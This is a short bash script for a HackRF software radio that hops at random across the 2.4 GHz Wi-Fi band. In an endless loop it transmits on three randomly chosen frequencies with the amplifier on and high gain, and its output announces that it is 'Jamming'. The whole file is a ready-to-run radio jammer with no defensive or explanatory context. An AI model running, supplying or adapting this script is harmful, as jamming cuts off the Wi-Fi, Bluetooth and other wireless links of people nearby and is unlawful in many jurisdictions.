#!/bin/bash

while true; do
    # Select 3 random frequencies in 5 MHz steps within 2.4 GHz Wi-Fi range
    f1=$(shuf -i 2400000000-2483000000 -n 1 | awk '{print int($1/5000000)*5000000}')
    f2=$(shuf -i 2400000000-2483000000 -n 1 | awk '{print int($1/5000000)*5000000}')
    f3=$(shuf -i 2400000000-2483000000 -n 1 | awk '{print int($1/5000000)*5000000}')

    # Random hop interval (between 50-500 ms)
    sleep_time=$(shuf -i 50-500 -n 1)

    echo "Jamming at: $f1 Hz, $f2 Hz, $f3 Hz for $sleep_time ms"

    # Kill any existing HackRF processes before starting new ones
    killall -9 hackrf_transfer 2>/dev/null

    # Start jamming on first frequency and wait before moving to the next
    hackrf_transfer -t /dev/zero -f $f1 -s 20000000 -a 1 -x 47 -n 1000000 &
    wait

    hackrf_transfer -t /dev/zero -f $f2 -s 20000000 -a 1 -x 47 -n 1000000 &
    wait

    hackrf_transfer -t /dev/zero -f $f3 -s 20000000 -a 1 -x 47 -n 1000000 &
    wait

    # Sleep for the random hop interval
    sleep $(echo "$sleep_time / 1000" | bc -l)
done

